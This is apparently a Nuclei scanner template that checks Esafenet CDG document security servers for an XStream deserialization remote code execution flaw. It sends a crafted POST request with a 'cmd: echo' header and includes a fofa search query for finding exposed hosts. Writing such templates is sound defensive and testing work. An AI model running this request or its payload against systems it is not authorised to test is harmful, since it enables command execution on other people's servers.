http:
    - matchers:
        - part: body
          type: word
          words:
            - Superhero
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /CDGServer3/SystemService?command=GETSYSTEMINFO HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
          Content-Type: text/xml
          cmd: echo Superhero

          
id: yisaitong-XStream-rce
info:
    author: Superhero
    description: |-
        fofa: body="CDGServer3"
        这个漏洞是由于系统引用了低版本的XStream库，该版本的XStream库存在反序列化漏洞，攻击者可以通过构造恶意的XStream反序列化XML Payload，绕过XStream的黑名单机制，触发反序列化过程，从而执行任意代码，控制服务器权限。
    name: 亿赛通电子文档安全管理系统 XStream反序列化 RCE
    reference:
        - https://mp.weixin.qq.com/s/q9ukDQl8eT4mHRw_v7NfGA?token=1015546094&lang=zh_CN
    severity: high
    tags: []
